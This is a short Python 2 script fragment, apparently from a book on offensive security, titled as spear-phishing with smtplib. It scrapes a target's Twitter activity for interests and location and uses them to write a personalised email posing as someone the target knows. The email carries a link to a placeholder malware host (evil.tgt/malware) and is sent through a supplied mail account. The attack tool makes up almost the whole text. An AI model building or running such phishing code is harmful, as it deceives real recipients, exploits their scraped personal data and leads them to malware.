# Spear-Phishing-with-Smtplib

Mass Social Engineering 241
  handle = options.handle
  tgt = options.tgt
  user = options.user
  pwd = options.pwd
  if handle == None or tgt == None\
   or user ==None or pwd==None:
    print parser.usage
    exit(0)
  print "[+] Fetching tweets from: "+str(handle)
  spamTgt = reconPerson(handle)
  spamTgt.get_tweets()
  print "[+] Fetching interests from: "+str(handle)
  interests = spamTgt.find_interests()
  print "[+] Fetching location information from: "+\
   str(handle)
  location = spamTgt.twitter_locate(’mlb-cities.txt’)
  spamMsg = "Dear "+tgt+","
  if (location!=None):
   randLoc=choice(location)
   spamMsg += " Its me from "+randLoc+"."
  if (interests[’users’]!=None):
   randUser=choice(interests[’users’])
   spamMsg += " "+randUser+" said to say hello."
  if (interests[’hashtags’]!=None):
   randHash=choice(interests[’hashtags’])
   spamMsg += " Did you see all the fuss about "+\
   randHash+"?"
  if (interests[’links’]!=None):
   randLink=choice(interests[’links’])
   spamMsg += " I really liked your link to: "+\
    randLink+"."
  spamMsg += " Check out my link to http://evil.tgt/malware"
  print "[+] Sending Msg: "+spamMsg
  sendMail(user, pwd, tgt, ’Re: Important’, spamMsg)
if __name__ == ’__main__’:
  main()
